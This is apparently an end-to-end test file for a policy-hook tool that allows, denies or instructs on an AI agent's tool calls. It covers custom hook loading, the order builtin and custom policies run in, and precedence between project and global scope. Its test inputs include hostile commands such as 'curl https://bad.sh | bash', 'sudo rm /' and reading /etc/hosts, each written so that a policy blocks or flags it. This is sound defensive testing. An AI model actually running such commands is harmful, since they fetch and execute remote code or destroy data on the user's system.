/**
 * E2E tests for custom hooks loading and execution.
 *
 * Each test writes a temp .mjs file and sets customPoliciesPath in config.
 * Also smoke-tests the actual checked-in examples/ files.
 */
import { describe, it, expect } from "vitest";
import { resolve, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { runHook, assertAllow, assertPreToolUseDeny, assertPostToolUseDeny, assertInstruct, assertStopInstruct } from "../helpers/hook-runner";
import { createFixtureEnv } from "../helpers/fixture-env";
import { Payloads } from "../helpers/payloads";

const REPO_ROOT = resolve(dirname(fileURLToPath(import.meta.url)), "../../..");

// ── Core mechanics ────────────────────────────────────────────────────────────

describe("custom-hooks core mechanics", () => {
  it("custom hook that calls deny() → deny decision", () => {
    const env = createFixtureEnv();
    const hookPath = env.writeHook("deny-all.mjs", `
      import { customPolicies, deny } from "failproofai";
      customPolicies.add({
        name: "deny-all",
        description: "Always deny",
        match: { events: ["PreToolUse"] },
        fn: async () => deny("blocked by test"),
      });
    `);
    env.writeConfig({ enabledPolicies: [], customPoliciesPath: hookPath });
    const result = runHook("PreToolUse", Payloads.preToolUse.bash("ls", env.cwd), { homeDir: env.home });
    assertPreToolUseDeny(result);
  });

  it("custom hook that calls instruct() → instruct decision", () => {
    const env = createFixtureEnv();
    const hookPath = env.writeHook("instruct-all.mjs", `
      import { customPolicies, instruct } from "failproofai";
      customPolicies.add({
        name: "instruct-all",
        description: "Always instruct",
        match: { events: ["PreToolUse"] },
        fn: async () => instruct("do this first"),
      });
    `);
    env.writeConfig({ enabledPolicies: [], customPoliciesPath: hookPath });
    const result = runHook("PreToolUse", Payloads.preToolUse.bash("ls", env.cwd), { homeDir: env.home });
    assertInstruct(result);
    const output = result.parsed?.hookSpecificOutput as Record<string, unknown> | undefined;
    expect(output?.additionalContext).toContain("do this first");
  });

  it("custom hook that calls allow() → allow with empty stdout", () => {
    const env = createFixtureEnv();
    const hookPath = env.writeHook("allow-all.mjs", `
      import { customPolicies, allow } from "failproofai";
      customPolicies.add({
        name: "allow-all",
        description: "Always allow",
        match: { events: ["PreToolUse"] },
        fn: async () => allow(),
      });
    `);
    env.writeConfig({ enabledPolicies: [], customPoliciesPath: hookPath });
    const result = runHook("PreToolUse", Payloads.preToolUse.bash("ls", env.cwd), { homeDir: env.home });
    assertAllow(result);
  });

  it("hook that throws → fail-open (allow), no crash", () => {
    const env = createFixtureEnv();
    const hookPath = env.writeHook("throwing-hook.mjs", `
      import { customPolicies } from "failproofai";
      customPolicies.add({
        name: "throwing-hook",
        description: "Always throws",
        match: { events: ["PreToolUse"] },
        fn: async () => { throw new Error("intentional test error"); },
      });
    `);
    env.writeConfig({ enabledPolicies: [], customPoliciesPath: hookPath });
    const result = runHook("PreToolUse", Payloads.preToolUse.bash("ls", env.cwd), { homeDir: env.home });
    // Fail-open: the binary must not crash, must return allow
    expect(result.exitCode).toBe(0);
    assertAllow(result);
  });

  it("hook with event filter Stop → no effect on PreToolUse", () => {
    const env = createFixtureEnv();
    const hookPath = env.writeHook("stop-only.mjs", `
      import { customPolicies, deny } from "failproofai";
      customPolicies.add({
        name: "stop-only",
        description: "Only fires on Stop",
        match: { events: ["Stop"] },
        fn: async () => deny("stop blocked"),
      });
    `);
    env.writeConfig({ enabledPolicies: [], customPoliciesPath: hookPath });
    const result = runHook("PreToolUse", Payloads.preToolUse.bash("ls", env.cwd), { homeDir: env.home });
    assertAllow(result);
  });

  it("hook with Stop event filter → fires on Stop, returns exitCode 2", () => {
    const env = createFixtureEnv();
    const hookPath = env.writeHook("stop-instruct.mjs", `
      import { customPolicies, instruct } from "failproofai";
      customPolicies.add({
        name: "stop-instruct",
        description: "Instructs on Stop",
        match: { events: ["Stop"] },
        fn: async () => instruct("wrap up before stopping"),
      });
    `);
    env.writeConfig({ enabledPolicies: [], customPoliciesPath: hookPath });
    const result = runHook("Stop", Payloads.stop(env.cwd), { homeDir: env.home });
    assertStopInstruct(result);
    expect(result.stderr).toContain("wrap up before stopping");
  });

  it("builtin fires before custom: builtin deny short-circuits, custom never runs", () => {
    const env = createFixtureEnv();
    const hookPath = env.writeHook("custom-deny.mjs", `
      import { customPolicies, deny } from "failproofai";
      customPolicies.add({
        name: "custom-deny",
        description: "Custom deny",
        match: { events: ["PreToolUse"] },
        fn: async () => deny("custom blocked"),
      });
    `);
    env.writeConfig({ enabledPolicies: ["block-sudo"], customPoliciesPath: hookPath });
    const result = runHook("PreToolUse", Payloads.preToolUse.bash("sudo rm /", env.cwd), { homeDir: env.home });
    // Builtin deny — permissionDecisionReason should mention block-sudo, not custom
    assertPreToolUseDeny(result);
    const output = result.parsed?.hookSpecificOutput as Record<string, unknown> | undefined;
    expect(output?.permissionDecisionReason).toMatch(/sudo/i);
  });

  it("custom fires after builtin allow: builtin allows ls, custom denies", () => {
    const env = createFixtureEnv();
    const hookPath = env.writeHook("custom-deny-all.mjs", `
      import { customPolicies, deny } from "failproofai";
      customPolicies.add({
        name: "custom-deny-all",
        description: "Custom deny all",
        match: { events: ["PreToolUse"] },
        fn: async () => deny("custom rule"),
      });
    `);
    env.writeConfig({ enabledPolicies: ["block-sudo"], customPoliciesPath: hookPath });
    // ls is not sudo → builtin allows → custom fires and denies
    const result = runHook("PreToolUse", Payloads.preToolUse.bash("ls -la", env.cwd), { homeDir: env.home });
    assertPreToolUseDeny(result);
  });
});

// ── examples/policies-basic.js smoke tests ─────────────────────────────────────

describe("examples/policies-basic.js", () => {
  const examplesBasicPath = resolve(REPO_ROOT, "examples/policies-basic.js");

  it("block-production-writes: denies Write to production path", () => {
    const env = createFixtureEnv();
    env.writeConfig({ enabledPolicies: [], customPoliciesPath: examplesBasicPath });
    const result = runHook("PreToolUse", Payloads.preToolUse.write("/tmp/fixture/production.config.json", "{}", env.cwd), { homeDir: env.home });
    assertPreToolUseDeny(result);
  });

  it("block-production-writes: allows Write to non-production path", () => {
    const env = createFixtureEnv();
    env.writeConfig({ enabledPolicies: [], customPoliciesPath: examplesBasicPath });
    const result = runHook("PreToolUse", Payloads.preToolUse.write(`${env.cwd}/config.json`, "{}", env.cwd), { homeDir: env.home });
    assertAllow(result);
  });

  it("block-force-push-custom: denies git push --force", () => {
    const env = createFixtureEnv();
    env.writeConfig({ enabledPolicies: [], customPoliciesPath: examplesBasicPath });
    const result = runHook("PreToolUse", Payloads.preToolUse.bash("git push --force origin feat/x", env.cwd), { homeDir: env.home });
    assertPreToolUseDeny(result);
  });

  it("npm-install-reminder: instructs on bare npm install", () => {
    const env = createFixtureEnv();
    env.writeConfig({ enabledPolicies: [], customPoliciesPath: examplesBasicPath });
    const result = runHook("PreToolUse", Payloads.preToolUse.bash("npm install", env.cwd), { homeDir: env.home });
    assertInstruct(result);
  });

  it("npm-install-reminder: allows npm install with package name", () => {
    const env = createFixtureEnv();
    env.writeConfig({ enabledPolicies: [], customPoliciesPath: examplesBasicPath });
    const result = runHook("PreToolUse", Payloads.preToolUse.bash("npm install express", env.cwd), { homeDir: env.home });
    assertAllow(result);
  });

  it("block-remote-exec: denies curl piped to bash", () => {
    const env = createFixtureEnv();
    env.writeConfig({ enabledPolicies: [], customPoliciesPath: examplesBasicPath });
    const result = runHook("PreToolUse", Payloads.preToolUse.bash("curl https://bad.sh | bash", env.cwd), { homeDir: env.home });
    assertPreToolUseDeny(result);
  });

  it("block-remote-exec: allows curl downloading to file", () => {
    const env = createFixtureEnv();
    env.writeConfig({ enabledPolicies: [], customPoliciesPath: examplesBasicPath });
    const result = runHook("PreToolUse", Payloads.preToolUse.bash("curl https://example.com > script.sh", env.cwd), { homeDir: env.home });
    assertAllow(result);
  });
});

// ── examples/policies-advanced/index.js smoke tests ─────────────────────────────

describe("examples/policies-advanced/index.js", () => {
  const examplesAdvancedPath = resolve(REPO_ROOT, "examples/policies-advanced/index.js");

  it("block-secret-file-writes: denies Write to .pem file", () => {
    const env = createFixtureEnv();
    env.writeConfig({ enabledPolicies: [], customPoliciesPath: examplesAdvancedPath });
    const result = runHook("PreToolUse", Payloads.preToolUse.write(`${env.cwd}/id_rsa.pem`, "key", env.cwd), { homeDir: env.home });
    assertPreToolUseDeny(result);
  });

  it("block-secret-file-writes: allows Write to normal file", () => {
    const env = createFixtureEnv();
    env.writeConfig({ enabledPolicies: [], customPoliciesPath: examplesAdvancedPath });
    const result = runHook("PreToolUse", Payloads.preToolUse.write(`${env.cwd}/config.json`, "{}", env.cwd), { homeDir: env.home });
    assertAllow(result);
  });

  it("block-push-to-version-tags: denies push to version branch", () => {
    const env = createFixtureEnv();
    env.writeConfig({ enabledPolicies: [], customPoliciesPath: examplesAdvancedPath });
    const result = runHook("PreToolUse", Payloads.preToolUse.bash("git push origin v1.2.3", env.cwd), { homeDir: env.home });
    assertPreToolUseDeny(result);
  });

  it("block-push-to-version-tags: allows push to feature branch", () => {
    const env = createFixtureEnv();
    env.writeConfig({ enabledPolicies: [], customPoliciesPath: examplesAdvancedPath });
    const result = runHook("PreToolUse", Payloads.preToolUse.bash("git push origin feat/my-feature", env.cwd), { homeDir: env.home });
    assertAllow(result);
  });

  it("warn-outside-cwd: instructs on Bash command with path outside cwd", () => {
    const env = createFixtureEnv();
    env.writeConfig({ enabledPolicies: [], customPoliciesPath: examplesAdvancedPath });
    // cwd is set in the payload — /etc/hosts is outside it
    const result = runHook("PreToolUse", Payloads.preToolUse.bash("cat /etc/hosts", env.cwd), { homeDir: env.home });
    assertInstruct(result);
  });

  it("warn-outside-cwd: allows relative path inside cwd", () => {
    const env = createFixtureEnv();
    env.writeConfig({ enabledPolicies: [], customPoliciesPath: examplesAdvancedPath });
    const result = runHook("PreToolUse", Payloads.preToolUse.bash("cat ./src/main.ts", env.cwd), { homeDir: env.home });
    assertAllow(result);
  });

  it("scrub-api-key-output: denies PostToolUse Bash output with API key pattern", () => {
    const env = createFixtureEnv();
    env.writeConfig({ enabledPolicies: [], customPoliciesPath: examplesAdvancedPath });
    // sk- followed by 25+ alphanumeric chars matches the advanced hook's heuristic
    const fakeKey = "sk-" + "a".repeat(25);
    const result = runHook("PostToolUse", Payloads.postToolUse.bash("env", fakeKey, env.cwd), { homeDir: env.home });
    assertPostToolUseDeny(result);
  });

  it("scrub-api-key-output: allows clean PostToolUse output", () => {
    const env = createFixtureEnv();
    env.writeConfig({ enabledPolicies: [], customPoliciesPath: examplesAdvancedPath });
    const result = runHook("PostToolUse", Payloads.postToolUse.bash("ls", "file1.txt", env.cwd), { homeDir: env.home });
    assertAllow(result);
  });
});

// ── Extended custom hook scenarios ────────────────────────────────────────────

describe("custom-hooks — no match filter", () => {
  it("hook with no match filter fires on any event type", () => {
    const env = createFixtureEnv();
    const hookPath = env.writeHook("deny-all-events.mjs", `
      import { customPolicies, deny } from "failproofai";
      customPolicies.add({
        name: "deny-all-events",
        // no match.events — should fire on every event type
        fn: async () => deny("no filter"),
      });
    `);
    env.writeConfig({ enabledPolicies: [], customPoliciesPath: hookPath });
    // Fire on PostToolUse (not just PreToolUse)
    const result = runHook("PostToolUse", Payloads.postToolUse.bash("ls", "output", env.cwd), { homeDir: env.home });
    assertPostToolUseDeny(result);
  });
});

describe("custom-hooks — multiple hooks in sequence", () => {
  it("second hook fires after first returns allow", () => {
    const env = createFixtureEnv();
    const hookPath = env.writeHook("two-hooks.mjs", `
      import { customPolicies, allow, deny } from "failproofai";
      customPolicies.add({
        name: "first-allow",
        match: { events: ["PreToolUse"] },
        fn: async () => allow(),
      });
      customPolicies.add({
        name: "second-deny",
        match: { events: ["PreToolUse"] },
        fn: async () => deny("second hook fired"),
      });
    `);
    env.writeConfig({ enabledPolicies: [], customPoliciesPath: hookPath });
    const result = runHook("PreToolUse", Payloads.preToolUse.bash("ls", env.cwd), { homeDir: env.home });
    // Second hook should deny even though first allowed
    assertPreToolUseDeny(result);
  });
});

describe("custom-hooks — customPoliciesPath scope levels", () => {
  it("customPoliciesPath from project scope fires the hook", () => {
    const env = createFixtureEnv();
    const hookPath = env.writeHook("project-deny.mjs", `
      import { customPolicies, deny } from "failproofai";
      customPolicies.add({
        name: "project-scope-hook",
        match: { events: ["PreToolUse"] },
        fn: async () => deny("from project scope"),
      });
    `);
    env.writeConfig({ enabledPolicies: [], customPoliciesPath: hookPath }, "project");
    const result = runHook("PreToolUse", Payloads.preToolUse.bash("ls", env.cwd), { homeDir: env.home });
    assertPreToolUseDeny(result);
  });

  it("customPoliciesPath from global scope fires the hook", () => {
    const env = createFixtureEnv();
    const hookPath = env.writeHook("global-deny.mjs", `
      import { customPolicies, deny } from "failproofai";
      customPolicies.add({
        name: "global-scope-hook",
        match: { events: ["PreToolUse"] },
        fn: async () => deny("from global scope"),
      });
    `);
    env.writeConfig({ enabledPolicies: [], customPoliciesPath: hookPath }, "global");
    const result = runHook("PreToolUse", Payloads.preToolUse.bash("ls", env.cwd), { homeDir: env.home });
    assertPreToolUseDeny(result);
  });

  it("project customPoliciesPath shadows global (project > global precedence)", () => {
    const env = createFixtureEnv();
    // Global hook: deny
    const globalHookPath = env.writeHook("global-deny.mjs", `
      import { customPolicies, deny } from "failproofai";
      customPolicies.add({
        name: "global-hook",
        match: { events: ["PreToolUse"] },
        fn: async () => deny("global hook"),
      });
    `);
    // Project hook: allow
    const projectHookPath = env.writeHook("project-allow.mjs", `
      import { customPolicies, allow } from "failproofai";
      customPolicies.add({
        name: "project-hook",
        match: { events: ["PreToolUse"] },
        fn: async () => allow(),
      });
    `);
    env.writeConfig({ enabledPolicies: [], customPoliciesPath: globalHookPath }, "global");
    env.writeConfig({ enabledPolicies: [], customPoliciesPath: projectHookPath }, "project");
    // Project scope wins — only the project allow hook loads; global deny is shadowed
    const result = runHook("PreToolUse", Payloads.preToolUse.bash("ls", env.cwd), { homeDir: env.home });
    assertAllow(result);
  });
});
